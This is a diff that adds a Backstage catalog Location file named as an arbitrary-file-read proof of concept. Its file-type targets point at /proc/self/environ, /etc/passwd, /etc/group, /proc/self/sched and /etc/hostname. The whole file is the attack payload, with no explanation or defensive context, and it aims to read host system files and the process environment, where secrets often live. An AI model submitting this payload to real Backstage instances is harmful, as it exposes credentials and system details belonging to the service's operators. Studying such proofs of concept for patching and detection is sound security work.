@@ -1,0 +1,12 @@
+apiVersion: backstage.io/v1alpha1
+kind: Location
+metadata:
+  name: backstage-arbitrary-file-read-poc
+spec:
+  type: file
+  targets:
+    - /proc/self/environ
+    - /etc/group
+    - /proc/self/sched
+    - /etc/passwd
+    - /etc/hostname
